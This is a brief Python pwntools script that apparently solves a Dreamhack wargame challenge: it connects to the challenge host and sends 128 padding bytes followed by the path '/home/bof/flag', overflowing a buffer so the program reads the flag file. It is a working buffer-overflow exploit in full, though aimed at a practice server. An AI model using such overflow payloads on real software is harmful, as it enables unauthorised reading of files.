from pwn import *
p = remote('host1.dreamhack.games', 10747)

payload = b'A' * 128
payload += b'/home/bof/flag'

p.sendlineafter('meow? ', payload)
p.interactive()
